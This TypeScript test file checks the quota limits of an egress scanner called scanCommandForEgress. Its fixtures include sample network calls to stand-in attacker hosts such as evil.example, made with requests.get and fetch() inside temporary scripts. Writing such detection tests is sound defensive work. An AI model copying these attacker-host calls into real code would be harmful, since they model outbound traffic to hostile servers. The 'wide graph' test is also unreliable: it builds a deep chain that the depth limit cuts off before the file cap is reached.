// Quota behavior for scanCommandForEgress: MAX_HITS=5, MAX_DEPTH=3,
// MAX_FILES_TOTAL=20. Uses real temp files for the recursion tests.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { scanCommandForEgress } from './src/scan-scripts.ts'

function w(dir: string, name: string, code: string) {
  writeFileSync(join(dir, name), code)
  return join(dir, name)
}

test('MAX_HITS: heredoc with 8 egress lines yields at most 5 hits', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'q-hits-'))
  const cmd = `python3 <<'EOF'\n` +
    `import requests\n` +
    [...Array(8)].map((_, i) => `requests.get("https://evil${i}.example/x")`).join('\n') +
    `\nEOF`
  const r = await scanCommandForEgress(cmd)
  assert.ok(r.hits.length <= 5, `hits=${r.hits.length} exceeds MAX_HITS`)
  assert.ok(r.hits.length >= 1, 'expected at least one hit')
})

test('MAX_DEPTH: recursion stops after 3 levels (deepest egress unseen)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'q-depth-'))
  w(dir, 'main.js', "require('./a.js')\n")
  w(dir, 'a.js', "require('./b.js')\n")
  w(dir, 'b.js', "require('./c.js')\n")
  w(dir, 'c.js', "require('./d.js')\n")
  w(dir, 'd.js', "require('./e.js')\nfetch('https://evil.example/d-level')\n")
  w(dir, 'e.js', "fetch('https://evil.example/e-level')\n")
  const r = await scanCommandForEgress(`node ${join(dir, 'main.js')}`)
  const urls = JSON.stringify(r.hits)
  assert.ok(!urls.includes('d-level'), `depth-4 egress seen (MAX_DEPTH broken) :: ${urls}`)
  assert.ok(!urls.includes('e-level'), `depth-5 egress seen (MAX_DEPTH broken) :: ${urls}`)
  // sanity: the c-level file itself should still be scanned if it had egress
  assert.ok(r.scannedFiles.length >= 4, `expected >=4 files scanned, got ${r.scannedFiles.length}`)
})

test('MAX_FILES_TOTAL: wide dependency graph caps at 20 files', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'q-files-'))
  // 26 modules, each requiring the next; deepest carries egress
  for (let i = 0; i < 25; i++) {
    w(dir, `m${i}.js`, `require('./m${i + 1}.js')\n`)
  }
  w(dir, 'm25.js', "fetch('https://evil.example/wide')\n")
  const r = await scanCommandForEgress(`node ${join(dir, 'm0.js')}`)
  assert.ok(r.scannedFiles.length <= 20, `scanned ${r.scannedFiles.length} files > 20`)
  // the chain is capped before reaching the last module
  assert.ok(!r.hits.some((h) => JSON.stringify(h).includes('wide')),
    'egress beyond the 20-file cap was seen')
})
